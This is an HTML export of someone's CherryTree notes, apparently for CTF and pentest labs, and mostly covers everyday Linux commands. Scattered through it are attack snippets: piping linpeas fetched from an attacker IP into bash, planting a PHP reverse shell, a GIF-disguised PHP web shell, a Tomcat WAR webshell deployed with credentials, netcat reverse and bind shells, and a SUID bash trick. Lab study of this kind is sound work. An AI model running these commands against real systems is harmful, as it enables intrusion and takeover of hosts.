<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>prova.ctb</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title level-1'>----------------LINUX--------------</h1><br/><strong><span style="color:#ff0000;background-color:#ffff00;">LINUX</span></strong></div><div class='page'><h1 class='title level-1'>basic commands</h1><br/></div><div class='page'><h1 class='title level-2'>chmod</h1><br/><strong><span style="color:#0000ff;">CHMOD     </span></strong><strong>								</strong><br /><strong>chmod u-r </strong>file<strong>   </strong>				#<strong>u</strong>=<strong> user/owner</strong><br />chmod<strong> g+x </strong>file<strong>   </strong>				#<strong>g</strong>=<strong> group   </strong><br />chmod<strong> o=rwx </strong>file<strong>   </strong>			#<strong>o </strong>=<strong> other users</strong><br /> <br /><strong>r = read (4)<br />w = write (2)<br />x =execute (1)</strong><br /> <br /><br /><strong>chmod 700 myfile </strong> 	(<strong>owner/ group/ world</strong>)<br /><strong>chmod 755     			rwxr-xr-x</strong><br /><br /><strong><span style="color:#0000ff;">#executable for everyone</span></strong><br />sudo<strong> chmod +x </strong>bash 			<br /><br /><strong><span style="color:#0000ff;">#SUID permission (sticky bit)</span></strong><br />sudo<strong> chmod +s </strong>bash<strong>  		</strong><br /></div><div class='page'><h1 class='title level-3'>modes</h1><br/>0 <strong>none</strong>      <br />1 <strong>execute only</strong>    <br />2 <strong>write </strong>only     <br />3 <strong>write</strong> and <strong>execute</strong>    <br />4 <strong>read</strong> only<br />5 <strong>read</strong> and <strong>execute</strong><br />6 <strong>read</strong> and <strong>write</strong><br />7 <strong>full</strong></div><div class='page'><h1 class='title level-2'>chown</h1><br/><strong><span style="color:#0000ff;">CHOWN</span></strong><br />sudo<strong> chown root </strong>bash<strong>  							#set owner = root</strong><br /></div><div class='page'><h1 class='title level-3'>file/group owners</h1><br/>   perm 	  <strong>file</strong> <strong>owner  group</strong><br /><strong><span style="color:#0000ff;">-</span></strong><strong>rw-rw-r--  </strong>cmnatic<strong> </strong>cmnatic<br /><strong><span style="color:#0000ff;">d</span></strong><strong>rwxrwxr-x</strong></div><div class='page'><h1 class='title level-2'>id</h1><br/><strong><span style="color:#0000ff;">ID</span></strong><br /><strong>id   						→ </strong><strong><span style="color:#0000ff;">root</span></strong>  <strong>uid=0(root) gid=0(root) groups=0(root)</strong><br /></div><div class='page'><h1 class='title level-2'>whoami</h1><br/><strong><span style="color:#0000ff;">WHOAMI        </span></strong><br /><strong>whoami</strong>   					#what user we&#39;re currently logged in as  <br /><strong>whoami /all </strong>  				<strong>#all privileges of user</strong> (see SE impersonate token)<br /></div><div class='page'><h1 class='title level-2'>groups</h1><br/><strong><span style="color:#0000ff;">GROUP</span></strong><br /><strong>groups</strong><br /></div><div class='page'><h1 class='title level-2'>su</h1><br/><strong><span style="color:#0000ff;">SU   </span></strong><em>#superuser</em><br /><strong>su</strong> jimmy  <br /><strong>su -</strong> jimmy  			#forces new shell<br /><strong>sudo su - </strong> 			#root priv<br /></div><div class='page'><h1 class='title level-2'>root shell</h1><br/><strong><span style="color:#0000ff;">ROOT SHELL</span></strong><br /><strong>sudo -i</strong><br /></div><div class='page'><h1 class='title level-2'>run</h1><br/> <strong><span style="color:#0000ff;">RUN</span></strong><br /><strong>./timer</strong><br /><br /><strong><span style="color:#0000ff;">#BASH</span></strong><br /><strong>bash</strong> LinEnum.<strong>sh</strong></div><div class='page'><h1 class='title level-2'>ls</h1><br/><strong><span style="color:#0000ff;">LS        <br /></span></strong><strong><span style="color:#4d4d4d;">ls -la<br />ls -la Scrivania </span></strong>				#different folder<br /><br /><strong>ls -a</strong> Pictures        <br /><strong>ls -l </strong>myfile<br /><br /><strong><span style="color:#0000ff;">#stat</span></strong><br /><strong>stat</strong> /bin/sysinfo<br /></div><div class='page'><h1 class='title level-2'>ln</h1><br/><strong><span style="color:#0000ff;">LN</span></strong><br />#<strong>creates symlink to folders</strong><br /><strong>ln -s</strong> /etc/<strong>shadow</strong> /home/giovanni/work/<strong>tmp</strong>  										#delete first tmp directory<br /></div><div class='page'><h1 class='title level-2'>cd</h1><br/><strong><span style="color:#0000ff;">CD</span></strong>			#change directory<br /><strong>cd usr</strong>		<br /><strong>cd</strong> .. 	<br /></div><div class='page'><h1 class='title level-2'>cat</h1><br/><strong><span style="color:#0000ff;">CAT        </span></strong>		#concatenate (open file) <br /><strong>cat</strong> file.txt  											 <br /></div><div class='page'><h1 class='title level-2'>less</h1><br/><strong><span style="color:#0000ff;">LESS</span></strong><br /><strong>less</strong> file.txt<br /></div><div class='page'><h1 class='title level-2'>head</h1><br/><strong><span style="color:#0000ff;">HEAD</span></strong><br /><strong>head</strong> <strong>-n </strong>7 file.txt				#<strong>numbers</strong><br /><strong>head -c </strong>3 file.txt					#<strong>bytes</strong></div><div class='page'><h1 class='title level-2'>tail</h1><br/><strong><span style="color:#0000ff;">TAIL</span></strong>												<br /><strong>#-f= see changes in file every time file changes</strong><br /><strong>tail -f </strong>/var/log/apache2/access.log   				<br /></div><div class='page'><h1 class='title level-2'>watch</h1><br/><strong><span style="color:#0000ff;">WATCH</span></strong><br /><strong>watch -n 1 &#39;ls -la&#39; </strong>  									#-n 1: update every second<br /><strong>watch -n 1 cat report</strong><br /></div><div class='page'><h1 class='title level-2'>pwd</h1><br/><strong><span style="color:#0000ff;">PWD</span></strong>    						<strong>#print working directory</strong><br /><strong>pwd</strong>    														#current directory<br /></div><div class='page'><h1 class='title level-2'>file</h1><br/><strong><span style="color:#0000ff;">FILE</span></strong>									#file informations<br /><strong>file example.db</strong>  					<br /><strong>file </strong>note<strong>  									#</strong>Determine the <strong>file</strong> <strong>type</strong></div><div class='page'><h1 class='title level-2'>wc</h1><br/><strong><span style="color:#0000ff;">WC</span></strong>									#word count<br /><strong>wc -c</strong> &quot;prova&quot;         							<br /><strong>echo -n </strong>fcf7c1b8749cf99d88e5f34271d636178fb5d130 <strong>| wc -c</strong><br /></div><div class='page'><h1 class='title level-2'>find</h1><br/><strong><span style="color:#0000ff;">FIND</span></strong><br /><strong>find . -writable</strong><br /><strong>find . -readable -ls</strong><br /><br />find / 2&gt;/dev/null | <strong>grep</strong> -i flag   											#find flag<br /><strong>find</strong> /home/igor/flag1.txt <strong>-exec </strong>cat {} \;<br /> <br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>name</h1><br/><strong><span style="color:#0000ff;">name</span></strong><br /><strong>find</strong> <strong>-name </strong>passwords.txt<br />find -name *.txt																#every .txt<br /> <br />find<strong> / -name</strong> flag2.txt <strong>2&gt;/dev/null   								</strong>#suppress all errors<br />find / <strong>-name</strong> *naughty* 2&gt;/dev/null<br /><strong>find / -name </strong>shadow<strong>*</strong> 2&gt;/dev/null</div><div class='page'><h1 class='title level-3'>type</h1><br/><strong><span style="color:#0000ff;">type</span></strong><br /><strong>find . -type f     								</strong>#list all files under current directory<br /><strong>find</strong> / <strong>-type f</strong> <strong>-name </strong>*.xml<br />find / -type <strong>d</strong> -name *exploits*				#directory</div><div class='page'><h1 class='title level-3'>user</h1><br/><strong><span style="color:#0000ff;">user</span></strong><br />find / <strong>-user </strong>ubuntu 2&gt;/dev/null  								<strong>	#files owned by user </strong>ubuntu</div><div class='page'><h1 class='title level-3'>perm</h1><br/><strong><span style="color:#0000ff;">perm</span></strong><br /><strong><span style="color:#0000ff;">#SUID permission</span></strong><br />find<strong> /</strong> <strong>-user</strong> igor <strong>-perm -4000</strong> <strong>-print </strong>2&gt;/dev/null<br />find <strong>/ -user</strong> root <strong>-perm</strong> <strong>-4000 -exec</strong> ls -ldb {} \;<br />find /usr/bin <strong>-type</strong> f <strong>-user</strong> root <strong>-perm -u=s  </strong><br /> <br /><br /> <br /></div><div class='page'><h1 class='title level-3'>group</h1><br/><strong><span style="color:#0000ff;">group</span></strong><br />find / <strong>-group</strong> developers <strong>2&gt;/dev/null</strong></div><div class='page'><h1 class='title level-3'>newermt</h1><br/><strong><span style="color:#0000ff;">time range      </span></strong>										<strong>#files between 2 dates</strong><br />find / <strong>-newermt</strong> 2019-09-<strong>01 ! -newermt</strong> 2019-09-<strong>15</strong> 2&gt;/dev/null  				<br />find / -newermt 2019-09-01 ! -newermt 2019-09-15 <strong>-ls</strong> 2&gt;/dev/null  				#see permissions</div><div class='page'><h1 class='title level-2'>locate</h1><br/><strong><span style="color:#0000ff;">LOCATE</span></strong><br /><strong>updatedb</strong><br /><strong>locate</strong> php-reverse-shell.php<br /></div><div class='page'><h1 class='title level-2'>grep</h1><br/><strong><span style="color:#0000ff;">GREP</span></strong><br /><strong>grep</strong> tomcat<br />grep password <strong>*</strong>   																	#finds the string password in all files<br /><strong>grep</strong> &quot;THM&quot; access.log   															#finds a string in a file<br /><strong>grep</strong> <strong>-i</strong> user config.dat<br />find .<strong> | grep -i </strong>tomcat    															  #<strong>-i=case insensitive</strong><br /><br />cat allport. nmap | <strong>grep</strong> <strong>^ [0-9]</strong> | awk -F<strong>/</strong> ‘{print $1}’  			  																#<strong>regexp:</strong> <strong>start with any number</strong>, <strong>split on /</strong><br /><strong>grep </strong>&quot;href=&quot; index.html | <strong>grep</strong> &quot;\.megacorpone&quot; | <strong>grep -v </strong>&quot;www\.megacorpone\.com&quot; | <strong>head</strong>				<strong>#-v = strip lines</strong><br /><br /><strong><span style="color:#0000ff;">#Before/After</span></strong><br />hashcat --example-hashes | <strong>grep</strong> -i cisco <strong>-A3 -B2  					  #3 lines after and before </strong>the hit<br /><strong>grep -i </strong>cascadeLegacyPwd<strong> -A 3 -B 3  #-A= after context -B= before context</strong><br /><br /><br /><br /> <br /> <br /><br /><strong>egrep</strong> -o &quot;[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}&quot; *  #regexp IP</div><div class='page'><h1 class='title level-2'>awk</h1><br/><strong><span style="color:#0000ff;">AWK</span></strong><br />nmap-scan_10.11.1.1-254 | grep 80 | grep -v &quot;Nmap&quot;<strong> | awk &#39;{print $2}&#39;</strong>    #print 2nd field, separator = space<br /><br /><strong><span style="color:#0000ff;">#field separator</span></strong>																					<br />cat users.txt | <strong>awk -F\[ &#39;{print $2}&#39;</strong> | <strong>awk -F\] &#39;{print $1}&#39;   </strong>		#<strong>-F\</strong>= field separator, used in enumdomusers<br /><br />		user:[<strong>arksvc</strong>] rid:[0x452]</div><div class='page'><h1 class='title level-2'>sed</h1><br/><strong><span style="color:#0000ff;">SED</span></strong><br /><strong><span style="color:#0000ff;">#substitute</span></strong><br /><strong>sed</strong> &#39;<strong>s/</strong>Blackhat/Defcon/&#39; <strong>myfile</strong>  									#substitute Blackhat with Defcon in myfile<br /><strong>sed -i</strong> &#39;<strong>s/</strong>OPENCV=<strong>0/</strong>OPENCV=<strong>1/</strong>&#39; <strong>Makefile</strong><br /><br /><br /><strong>sed</strong> <strong>-n 148p</strong> /home/santa/naughty_list.txt 						#selects given row in a file<br /><br /><br />REGEXP<br />%s/\;\r\n  #substitute ; with newline</div><div class='page'><h1 class='title level-2'>logic operands</h1><br/><strong><span style="color:#0000ff;">LOGIC OPERANDS</span></strong><br /><strong>&amp;</strong> 			run commands in the background of your terminal<br /><strong>&amp;&amp; </strong>  	combine multiple commands together in one line<br /><strong>|| </strong> 		logical or<br /></div><div class='page'><h1 class='title level-2'>redirect output</h1><br/><strong><span style="color:#0000ff;">REDIRECT OUTPUT</span></strong><br />takes the output from a command (such as using cat to output a file) and direct it elsewhere:<br /><br /><strong><span style="color:#0000ff;">#Overwrite</span></strong><br /><strong>echo “hello” &gt; welcome  </strong>#overwrites the output<br /> <br /><strong><span style="color:#0000ff;">#Append</span></strong><br /><strong>echo </strong>“<strong>hello” &gt;&gt; welcome</strong>  #appends the output  <br /></div><div class='page'><h1 class='title level-2'>mkdir</h1><br/><strong><span style="color:#0000ff;">MKDIR</span></strong><br /><strong>mkdir </strong>/mnt/smb   							 	#create folder<br /><strong>mkdir -p </strong>personal/stuff						#creates parent folder aswel<br /></div><div class='page'><h1 class='title level-2'>cp</h1><br/><strong><span style="color:#0000ff;">CP</span></strong>										<br /><strong>cp</strong> linux-exploit-suggester.sh ~/Scrivania							#Copy a file or folder<br /><br /><br /><strong><span style="color:#0000ff;">#base64 copy</span></strong><br /><strong>base64 </strong>backup.<strong>zip</strong>   										#copy base64<br />nano backup.zip.b64   										#paste content in new folder<br /><strong>base64 -d </strong>backup.zip.b64 <strong>&gt; backup.zip</strong></div><div class='page'><h1 class='title level-2'>mv</h1><br/><strong><span style="color:#0000ff;">MV</span></strong><br /><strong>mv</strong> ssh.conf /home/newfolder				#Move a file or folder<br /><br /><strong><span style="color:#0000ff;">#rename a file</span></strong><br /><strong>mv</strong> <strong>ssh.</strong>conf <strong>NewSSH</strong>.conf<br /></div><div class='page'><h1 class='title level-2'>rm</h1><br/><strong><span style="color:#0000ff;">RM</span></strong><br /><strong>rm</strong> note.txt  									#<strong>file</strong><br /><strong>rm -rf</strong> temp  								#<strong>directory</strong> (<strong>-r=recursive</strong>)<br /></div><div class='page'><h1 class='title level-2'>which</h1><br/><strong><span style="color:#0000ff;">WHICH</span></strong><br /><strong>which gcc</strong>					#see if program is installed</div><div class='page'><h1 class='title level-1'>file download</h1><br/></div><div class='page'><h1 class='title level-2'>curl</h1><br/><strong><span style="color:#0000ff;">CURL</span></strong><br /><strong>curl</strong> 10.10.14.11:8000/linpeas.sh <strong>| bash     								#execute directly</strong><br /><strong>curl</strong> 10.10.16.2:8000/<strong>chisel.exe -o</strong> chisel.exe					        	<strong>#-o = output file	</strong>			<br /><strong>curl </strong>10.10.10.157/centreon/api/index.php?action=authenticate<span style="color:#0000ff;"> </span><strong>-d </strong>&#39;username=admin<strong>&amp;</strong>password=centreon&#39;				 #<strong>-d</strong>= post request data<br /><br />curl -s http://10.10.73.173/Account/login.aspx?ReturnURL=/admin/ <strong>| grep &quot;&lt;form&quot;</strong>					#<strong>-s </strong>= silent mode<br /><strong>curl -k </strong><a href="https://cdn.jsdelivr.net/npm/vue/dist/vue.js">https://friendzoneportal.red/z.gif</a> <strong>-o </strong>z.gif<br /> <br /><strong><span style="color:#0000ff;">#file</span></strong><br /><strong>curl file:</strong>///etc/passwd<br /></div><div class='page'><h1 class='title level-2'>wget</h1><br/><strong><span style="color:#0000ff;">WGET      </span></strong>				cd<strong> /dev/shm</strong><br /><span style="color:#0000ff;">#</span><strong><span style="color:#0000ff;">no direct execution</span></strong><br /><strong>wget</strong> 10.10.14.11:8000/<strong>linpeas.sh<br />bash linpeas.sh</strong><br /><strong><span style="color:#0000ff;">#exec bash file</span></strong><br />wget <strong>-O</strong> - <a href="http://10.10.16.5:8000/linpeas.sh">http://10.10.16.5:8000/</a><a href="http://10.10.16.5:8000/linpeas.sh">linpeas.</a><strong>sh | bash      </strong><br /><br /><strong><span style="color:#0000ff;">#recursive</span></strong><br />wget <strong>-r </strong><a href="http://10.10.14.11:8000/">http://10.10.14.11:8000/</a>   <br /><strong><span style="color:#0000ff;">#output file</span></strong><br />wget <strong>-O</strong> /var/www/html/<strong>shell.php</strong> <a href="http://10.10.14.18/php-reverse-shell.php">http://10.10.14.18/</a><a href="http://10.10.14.18/php-reverse-shell.php">php-reverse-shell.php</a><br /><br /><strong><span style="color:#0000ff;">#ftp</span></strong><br /><strong>wget -m ftp://anonymous:anonymous</strong>@10.10.10.98   								<strong>#passive mode ftp</strong><br />wget -m <strong>--no-passive ftp://anonymous:anonymous</strong>@10.10.10.98  			<strong>#active mode ftp</strong></div><div class='page'><h1 class='title level-2'>scp</h1><br/> <strong><span style="color:#0000ff;">SCP</span></strong><strong> (secure copy)</strong><br /><br /> <br /> <br /> <br /></div><div class='page'><h1 class='title level-3'>local to remote</h1><br/><strong><span style="color:#0000ff;">#local machine to remote machine</span></strong><br /><strong>scp</strong> <strong>important.txt</strong> <strong>ubuntu@</strong>192.168.1.30<strong>:</strong>/home/ubuntu/<strong>transferred.txt</strong><br /><strong>scp</strong> <strong>pspy64s</strong> floris@10.10.10.150:<strong>/tmp</strong><br /><strong>scp</strong> pspy friend<strong>@</strong>10.10.10.123:</div><div class='page'><h1 class='title level-3'>remote to local</h1><br/><strong><span style="color:#0000ff;">#remote machine to local machine</span></strong><br /><strong>scp</strong> <strong>djmardov@</strong>10.10.10.117<strong>:/usr/bin</strong>/<strong>viewuser</strong> <strong>viewuser</strong><br />scp ubuntu@10.10.150.30:/home/ubuntu/<strong>documents.txt</strong> notes.txt								#file-file<br /><strong>scp</strong> <strong>james@</strong>10.10.250.209<strong>:</strong>/home/james/<strong>Alien_autospy.jpg</strong> <strong>prova.jpg</strong></div><div class='page'><h1 class='title level-1'>tmux</h1><br/><strong><span style="color:#0000ff;">TMUX (Terminal Multiplexer)</span></strong><br />vim ~/.tmux.conf  					#config file<br /><br /><strong>tmux         																																					 set-option -g prefix C-a</strong><br /><strong>q</strong>    <strong> 												#exit</strong><br /><strong><span style="color:#0000ff;">#sessions</span></strong><br />tmux<strong> new -s HTB 				</strong>		#new session<br />tmux <strong>ls</strong>  										#list sessions<br /><br /><strong><span style="color:#0000ff;">#new window</span></strong><br /><strong>ctrl+B+ C   </strong><br /> <br /><strong><span style="color:#0000ff;">#switch windows  </span></strong><br />ctrl+B+<strong> 0 </strong>(1,2,3…) <strong>  </strong><br /> <br /><strong><span style="color:#0000ff;">#rename window</span></strong><br />ctrl+B+<strong> ‘    </strong><br /> <br />ctrl+B+<strong> S </strong>   #send to window (to join windows)<br /><strong>#find window</strong><br />ctrl+B+<strong> , </strong>   <br /><br /><strong><span style="color:#0000ff;">#copy mode</span></strong><br />ctrl+B+<strong> [    </strong><br /> <br /><strong><span style="color:#0000ff;">#search up down</span></strong><br />ctrl+B+<strong> ? (o /)    				</strong><br />ctrl+B+<strong> space   					#select</strong><br />ctrl+B+<strong> enter   					#copy to a buffer</strong><br /><br /><strong><span style="color:#0000ff;">#split</span></strong><br />ctrl+B+<strong> %   #vertical split</strong><br />ctrl+B+<strong> “   #horiziontal split</strong><br /> <br />ctrl+B+<strong> --&gt;   #move</strong><br /> <br /><strong><span style="color:#0000ff;">#zoom in/out</span></strong><br />ctrl+B+<strong> z   </strong><br /><br />ctrl+B+<strong> { (o })  #switch splitted windows</strong><br /><strong>set mouse on</strong><br /></div><div class='page'><h1 class='title level-1'>editors</h1><br/></div><div class='page'><h1 class='title level-2'>touch</h1><br/><strong><span style="color:#0000ff;">TOUCH</span></strong><br /><strong>touch </strong>note<strong>  </strong>									#create file<br /></div><div class='page'><h1 class='title level-2'>nano</h1><br/><strong><span style="color:#0000ff;">NANO</span></strong> 										<strong>#text editor</strong><br /><strong>nano</strong> myfile   									<br />									<br /><strong><span style="color:#0000ff;">Cut</span></strong><strong>					Ctrl+K</strong><br /><br /><strong><span style="color:#0000ff;">Undo</span></strong>				<strong>Alt+U</strong><br /><strong><span style="color:#0000ff;">Redo</span></strong>				<strong>Alt+E</strong><br /><br /><strong><span style="color:#0000ff;">Save</span></strong>				<strong>Ctrl+Y</strong><br /><strong><span style="color:#0000ff;">Exit</span></strong><strong> 	</strong>			<strong>Ctrl+X </strong>  											</div><div class='page'><h1 class='title level-2'>vi/vim</h1><br/><strong><span style="color:#9900ff;">VI /VIM</span></strong><br /><strong>vi</strong> LinEnum.sh<strong>    																		<br />vim </strong>LinEnum.sh<br /><br /><br /><strong>:set number </strong> 																		#shows numbering<br /><br /><br />  <br /><br /><br /></div><div class='page'><h1 class='title level-3'>insert mode</h1><br/><strong><span style="color:#0000ff;">Insert mode</span></strong><br /><strong>i   										#insert mode</strong><br /><strong>maiusc + ins  						#copy clipboard</strong></div><div class='page'><h1 class='title level-3'>command mode</h1><br/><strong><span style="color:#0000ff;">Command mode</span></strong><br /><strong>ESC  #</strong>back to<strong> command mode</strong><br /><br /><strong><span style="color:#0000ff;">#cursor</span></strong><br /><strong>k  					#cursor up  </strong><br /><strong>j  						#cursor down  10j</strong><br /><strong>h  					#cursor left</strong><br /><strong>l  						#cursor right</strong><br /><strong>gg  					#top</strong><br /><strong>G  					#bottom</strong><br /><strong>{  					#skip block</strong><br /><br /><br /><strong>u   					#undo </strong> <br /><strong>Ctrl+r  			#redo</strong><br /><br /><strong><span style="color:#0000ff;">#copy/paste</span></strong><br /><strong>yy</strong>    				#<strong>copy</strong> a <strong>line</strong><br /><strong>dd  					#delete </strong>a<strong> line   3dd deletes 3 lines</strong><br /><strong>:set paste </strong>		#set paste mode  (then i and maiusc + ins and esc)<br /><strong>p</strong>      				#<strong>paste</strong><br /><br />  <br /><strong>:%s</strong>/provisioner/prov/g   								#<strong>%s=substitute </strong> g =substitute all</div><div class='page'><h1 class='title level-3'>exiting</h1><br/><strong><span style="color:#0000ff;">#exiting</span></strong><br /><strong>:w   				#write changes</strong><br /><strong>:q  				#quit</strong><br /><strong>:q!  				#quit without saving</strong><br /><strong>:wq  			#write and quit</strong><br /> <br /> <br /> <strong>/</strong>string  #seraches string<br />maiusc + N  #go down in search</div><div class='page'><h1 class='title level-1'>archives</h1><br/></div><div class='page'><h1 class='title level-2'>zip/rar</h1><br/><strong><span style="color:#0000ff;">UNZIP</span></strong>								<strong><span style="color:#0000ff;">ZIP / RAR</span></strong><br /><strong>unzip </strong>file.<strong>zip</strong> <strong>-d</strong> folder<br /><br /></div><div class='page'><h1 class='title level-2'>tar</h1><br/><strong><span style="color:#0000ff;">TAR    </span></strong>																			#archive <br /><strong><span style="color:#0000ff;">#</span></strong><strong><span style="color:#0000ff;">extract</span></strong><span style="color:#0000ff;"> </span><strong><span style="color:#0000ff;">file</span></strong><br /><strong>tar -xf </strong>backup.<strong>tar</strong><br /><strong>tar -xvf</strong> backup.tar  					#<strong>-v = verbose</strong><br /><br /><strong><span style="color:#0000ff;">filters</span></strong><br /><strong><span style="color:#0000ff;">#gzip</span></strong><br /><strong>tar -zxvf </strong>LibreOffice_7.2.0_Linux_x86-64_deb.<strong>tar.gz   						# -z= </strong>filter with<strong> gzip</strong><br /><strong><span style="color:#0000ff;">#bzip2</span></strong><br /><strong>tar -jxvf </strong>FileZilla_3.55.1_x86_64_src.<strong>tar.bz2    									# -j= </strong>filter with <strong>bzip2</strong><br /><br />  <br /></div><div class='page'><h1 class='title level-3'>create</h1><br/><strong><span style="color:#0000ff;">#create</span></strong> <strong><span style="color:#0000ff;">tar</span></strong><br /><strong>tar -cvf</strong> tecmint-14-09-12.<strong>tar</strong> /home/tecmint/ <br /><strong>tar cf</strong> /home/milesdyson/backups/<strong>backup.tgz</strong> *<br /></div><div class='page'><h1 class='title level-2'>7z</h1><br/><strong><span style="color:#0000ff;">7z</span></strong><br /><strong>7z x</strong> Access\ Control.zip   								#<strong>x=extract </strong> (uses password)<br /><strong>7z l -slt</strong> Access\ Control.zip    							#<strong>l=list content, encryption</strong><br /></div><div class='page'><h1 class='title level-2'>gzip</h1><br/><strong><span style="color:#0000ff;">GZIP</span></strong><br /><strong>zcat</strong> file1 &gt; file2<br /><br /><strong><span style="color:#0000ff;">GUNZIP</span></strong>	<br /><strong>gunzip</strong> <strong>-d</strong> chisel_1.7.6_windows_amd64.<strong>gz</strong>ù</div><div class='page'><h1 class='title level-2'>bzip2</h1><br/><strong><span style="color:#0000ff;">BZIP2</span></strong><br /><strong>bzcat </strong>file1 &gt; file2<br /></div><div class='page'><h1 class='title level-2'>jar</h1><br/><strong><span style="color:#0000ff;">JAR</span></strong><br /><strong>unzip </strong>BlockyCore.jar<br /><br /><strong><span style="color:#0000ff;">#jad</span></strong><br /><strong>jad BlockyCore.class</strong><br />less <strong>BlockyCore.jad</strong><br /><br /><br /><strong><span style="color:#0000ff;">#graphical</span></strong><br /><strong>jd-gui</strong><br /></div><div class='page'><h1 class='title level-2'>war</h1><br/><strong><span style="color:#0000ff;">WAR  (tomcat)</span></strong><br /><strong>zip webshell.war cmd.jsp</strong><br /> <br /><strong>curl -u</strong> tomcat:\$3cureP4s5w0rd123! <strong>-T</strong> webshell.war <a href="http://10.10.10.194:8080/manager/text/deploy?path=/webshell&update=true">http://10.10.10.194:8080/manager</a><a href="http://10.10.10.194:8080/manager/text/deploy?path=/webshell&update=true">/text/deploy?path=/webshell&amp;update=true</a><br />  → /webshell/cmd.jsp<br /></div><div class='page'><h1 class='title level-1'>system control</h1><br/></div><div class='page'><h1 class='title level-2'>ps</h1><br/><strong><span style="color:#0000ff;">PS</span></strong>										<strong>#processes running</strong><br /><strong>ps -aux	</strong>									<br />ps -aux | <strong>grep root</strong>						#only root<br /><br /><strong><span style="color:#0000ff;">#alternative syntax</span></strong><br /><strong>ps -ef</strong><br />ps -ef | grep 1239							#see process users</div><div class='page'><h1 class='title level-2'>service</h1><br/><strong><span style="color:#0000ff;">SERVICE<br /></span></strong><strong>service </strong>apache2 <strong>start</strong><br /><strong>service </strong>apache2 <strong>stop</strong><br /></div><div class='page'><h1 class='title level-2'>systemctl</h1><br/><strong><span style="color:#0000ff;">SYSTEMCTL </span></strong><strong>   </strong>								<strong>#services</strong><br /><strong>systemctl</strong> <strong>enable</strong> apache2<br />systemctl <strong>start</strong> apache2<br />systemctl <strong>stop</strong> apache2<br /></div><div class='page'><h1 class='title level-2'>jobs</h1><br/><strong><span style="color:#0000ff;">JOBS</span></strong><br /><strong>jobs</strong><br /><strong>kill %1   </strong>				#to close<br /></div><div class='page'><h1 class='title level-2'>task manager</h1><br/><strong><span style="color:#0000ff;">TASK MANAGER</span></strong><br /><strong>top</strong><br /></div><div class='page'><h1 class='title level-2'>iptables</h1><br/><strong><span style="color:#0000ff;">IPTABLES</span></strong><br /><strong>iptables -L</strong><br /></div><div class='page'><h1 class='title level-2'>history</h1><br/><strong><span style="color:#0000ff;">HISTORY</span></strong>				#history of all commands runned in terminal<br /><strong>history</strong>   									<br /><strong>history </strong>| <strong>grep </strong>ping<br /></div><div class='page'><h1 class='title level-2'>du</h1><br/><strong><span style="color:#0000ff;">DU     </span></strong><strong>														#disk usage</strong><br /><strong>du -hs </strong>WindowsImageBackup<br /><br /><strong>du -hs *</strong><br /><strong>du -hs * | sort -h</strong><br /><br /><strong><span style="color:#0000ff;">#hidden files</span></strong><br /><strong>du -hs </strong>/home/kali/.<strong>* | sort -h</strong><br /></div><div class='page'><h1 class='title level-2'>df</h1><br/><strong><span style="color:#0000ff;">DF</span></strong><br /><strong>df -lh </strong> 									#file system space<br /><strong>strings /dev/sdb</strong><br /></div><div class='page'><h1 class='title level-2'>screen</h1><br/><strong><span style="color:#0000ff;">SCREEN</span></strong><br /><strong>screen -S </strong>prova<strong>   			#new session</strong><br /><strong>screen -ls    					#list sessions</strong><br /><strong>screen -r </strong>10835<strong>   			#resume session</strong></div><div class='page'><h1 class='title level-1'>scripting</h1><br/></div><div class='page'><h1 class='title level-2'>bash</h1><br/><strong>#!/bin/bash</strong><br /><br /><strong><span style="color:#0000ff;">FOR LOOP</span></strong><br /><strong>for </strong>ip <strong>in $</strong>(<strong>seq</strong> 1 10); <strong>do </strong>echo 10.11.1.$ip; <strong>done</strong><br /><br /><strong><span style="color:#0000ff;">Es 1:</span></strong><br /><strong>#!/bin/bash</strong><br />for <strong>ip </strong>in ‘seq <strong>1 254</strong>’; do<br />ping -c 1 <strong><span style="color:#0000ff;">$1</span></strong><strong>.$ip</strong> | grep “64 byes” | cut -d “ “ -f 4 | tr -d “:” &amp;<br />done<br /><br /><strong>./ipsweep.sh </strong><strong><span style="color:#0000ff;">192.168.1</span></strong><strong> </strong>&gt; iplist.txt<br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>python</h1><br/><strong><span style="color:#0000ff;">PYTHON</span></strong><br /><br /><strong><span style="color:#0000ff;">Es 1:</span></strong><br />import requests<br /><strong>requests.head</strong>(&#39;<a href="http://10.10.10.121/support/">http://10.10.10.121/support/</a>&#39;)   							  #&lt;Response [200]&gt;<br />response = <strong>requests.head</strong>(&#39;http://10.10.10.121/support/&#39;)<br /> <br />dir(response)<br /><strong>response.header</strong><br />response.headers[&#39;Date&#39;]<br /></div><div class='page'><h1 class='title level-2'>php</h1><br/><strong><span style="color:#0000ff;">PHP</span></strong><br /><strong>php -a </strong> 														#interactive mode<br />echo <strong>password_hash</strong>(&#39;ippsec&#39;, <strong>PASSWORD_DEFAULT</strong>);<br /><br /><br /><strong><span style="color:#0000ff;">#command execution</span></strong><br />GIF89a <br /><strong>&lt;?php echo system($_REQUEST[&#39;ippsec&#39;]);?&gt;   												</strong><br /> <br />bank.htp/uploads/corners.htb<strong>?ippsec=ls</strong></div><div class='page'><h1 class='title level-1'>shells</h1><br/></div><div class='page'><h1 class='title level-2'>netcat</h1><br/><strong><span style="color:#0000ff;">NETCAT   																																							  </span></strong><br /><strong>nc</strong> <strong>-v</strong> 10.10.10.160 <strong>6379</strong>   						#ports to use: <strong>80</strong>, <strong>443</strong> or <strong>53</strong>  <br /><br /><br /><br /><br /><br />  <br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>reverse shell</h1><br/><strong><span style="color:#0000ff;">REVERSE SHELL</span></strong><br /><strong>nc -lvnp </strong>9001     														<strong>#attacker</strong><br /><strong>nc</strong> 10.10.14.11 9001 <strong>-e /bin/bash 							#victim </strong>(also with command injection)</div><div class='page'><h1 class='title level-3'>bind shell</h1><br/><strong><span style="color:#0000ff;">BIND SHELL</span></strong><br /><strong>nc -lvnp </strong>9001 <strong>-e /bin/bash   									#-e= execute command (also </strong>/bin/<strong>sh)</strong><br /><strong>nc</strong> 10.10.14.11 9001</div><div class='page'><h1 class='title level-3'>listener</h1><br/><strong><span style="color:#0000ff;">Listener</span></strong><br /><strong>nc</strong> <strong>-lvnp</strong> <strong>9001</strong>   								<strong>#attacker: l=listener</strong>, <strong>p</strong>=<strong>listening</strong> 